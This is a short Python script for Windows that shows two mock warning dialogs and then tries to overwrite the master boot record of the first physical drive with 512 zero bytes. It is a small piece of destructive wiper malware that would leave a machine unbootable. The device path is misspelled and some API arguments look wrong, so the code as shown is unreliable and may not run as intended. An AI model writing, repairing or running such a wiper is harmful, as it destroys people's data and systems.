from win32file import *
from win32api import *
from win32gui import *
from win32con import*
from win32ui import *
import sys

title = "Please notice before you run this program"
description = "Please notice before you run this program: This is a malicious file that will harm your computer. Would you like to continue? THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE TO YOUR COMPUER!\n\nPress \"Yes\" to continue. \nPress \"No\" to exit."

if MessageBox(description, title, MB_ICONWARNING | MB_YESNO ) == IDNO:
    print('scared gato')
    sys.exit(0)

title = 'LAST WARNING!!!'
description = ('This will destroy your system. Are you sure you wanna do this(Will overwrite MBR)? \n\nPress \"Yes\" to continue. \nPress \"No\" to exit')

if MessageBox(description, title, MB_ICONWARNING | MB_YESNO ) == IDNO:
    print('SECOND PRESSED NO')
    sys.exit(0)

print('MBR OVERWRITHING...')

hDevice = CreateFileW(r"\\.\PhsysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_GENERIC_WRITE, None, OPEN_ALWAYS,
                      0, 0)
buffer = bytes([0 for i in range(512)
])

bytes_writen = WriteFile(hDevice, buffer, None)
print("Wrote", bytes_writen, "bytes to the MBR SUCCEFULLY!")

CloseHandle(hDevice)
